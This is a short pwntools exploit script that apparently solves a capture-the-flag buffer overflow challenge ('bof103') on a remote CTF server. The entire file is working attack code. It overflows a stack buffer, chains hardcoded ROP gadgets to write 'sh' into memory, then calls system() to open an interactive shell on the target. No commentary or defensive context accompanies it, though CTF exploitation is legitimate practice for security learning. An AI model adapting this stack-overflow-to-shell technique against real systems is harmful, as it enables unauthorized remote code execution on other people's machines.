from pwn import *
#io = process("./bof103")
io = remote("bof103.sstf.site",1337)

popRdi = p64(0x400723)
popRsi = p64(0x4006b8)
useme  = p64(0x400626)
key    = p64(0x601058)
systemPlt = p64(0x4004e0)

rop  = b"A"*16 + p64(0) 
rop += popRdi + p64(1) + popRsi + p64(0x6873) + useme
rop += popRdi + key + systemPlt

io.sendlineafter("name",rop)
io.interactive()
